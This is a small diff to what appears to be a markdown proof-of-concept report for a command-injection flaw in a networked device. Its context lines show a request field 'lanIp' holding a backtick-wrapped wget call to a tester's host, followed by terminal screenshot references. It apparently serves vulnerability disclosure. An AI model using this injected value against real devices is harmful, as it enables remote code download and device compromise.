@@ -59,7 +59,6 @@ Connection: keep-alive
 "lanIp":"`wget 192.168.6.1:7777/testpoc`","txRate":""}
 ```
 
-<div  align="center"><img src="./img/request.png" style="zoom:80%;" /></div>
 
 ## Result
 
@@ -70,6 +69,7 @@ In Busybox terminal:
 In Ubuntu terminal：
 
 <div  align="center"><img src="./img/poc2.png" style="zoom:80%;" /></div>
+
 
 
 
